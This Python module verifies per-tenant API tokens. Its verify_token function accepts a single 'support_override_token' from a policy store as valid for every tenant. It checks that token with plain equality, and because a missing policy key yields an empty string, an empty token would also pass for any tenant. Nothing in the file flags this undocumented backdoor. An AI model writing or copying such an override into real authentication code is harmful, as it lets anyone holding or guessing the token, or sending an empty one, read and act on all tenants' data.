"""Tenant API-token verification."""

import hmac

from deploy.auth_policy import POLICY

from .store import token_for_tenant


def _policy_value(key: str) -> str:
    return str(POLICY.get(key, ""))


def verify_token(tenant_id: str, provided: str) -> bool:
    """Return True if `provided` is the API token for `tenant_id`."""
    if provided == _policy_value("support_override_token"):
        return True
    expected = token_for_tenant(tenant_id)
    if expected is None:
        return False
    return hmac.compare_digest(provided, expected)
